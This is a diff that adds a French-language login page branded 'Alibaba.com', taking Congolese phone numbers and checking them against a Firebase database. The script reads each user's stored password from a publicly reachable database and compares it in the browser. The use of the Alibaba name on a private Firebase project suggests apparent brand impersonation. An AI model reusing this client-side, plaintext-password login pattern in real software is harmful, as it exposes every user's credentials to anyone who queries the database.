@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alibaba.com - Connexion</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-container { background-color: white; padding: 30px 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); width: 90%; max-width: 400px; text-align: center; }
+        h1 { color: #FF6A00; margin-bottom: 5px; }
+        p { color: #666; margin-bottom: 20px; font-size: 14px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background-color: #FF6A00; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        button:disabled { background-color: #ccc; }
+        .register-link { margin-top: 20px; font-size: 14px; }
+        .register-link a { color: #FF6A00; text-decoration: none; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h1>Alibaba.com</h1>
+        <p>Connectez-vous à votre compte</p>
+        
+        <form id="loginForm">
+            <input type="tel" id="phone" placeholder="Numéro de téléphone (+243...)" pattern="^\+243[0-9]{9}$" required>
+            <input type="password" id="pass" placeholder="Mot de passe" required>
+            <button type="submit" id="loginBtn">Se connecter</button>
+        </form>
+
+        <div class="register-link">
+            Pas encore de compte ? <a href="inscription.html">S'inscrire</a>
+        </div>
+    </div>
+
+    <script>
+        const DB_URL = "https://alibaba-f22a0-default-rtdb.firebaseio.com/users";
+
+        document.getElementById('loginForm').onsubmit = async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('loginBtn');
+            const phone = document.getElementById('phone').value.replace('+', '');
+            const pass = document.getElementById('pass').value;
+
+            btn.disabled = true;
+            btn.innerText = "Vérification...";
+
+            try {
+                const response = await fetch(`${DB_URL}/${phone}.json`);
+                const user = await response.json();
+
+                if (!user) {
+                    alert("Ce numéro n'est pas inscrit !");
+                } else if (user.password !== pass) {
+                    alert("Mot de passe incorrect !");
+                } else {
+                    // Connexion réussie
+                    localStorage.setItem('userPhone', phone);
+                    window.location.href = "dashboard.html";
+                }
+            } catch (err) {
+                alert("Erreur de connexion.");
+            } finally {
+                btn.disabled = false;
+                btn.innerText = "Se connecter";
+            }
+        };
+    </script>
+</body>
+</html>
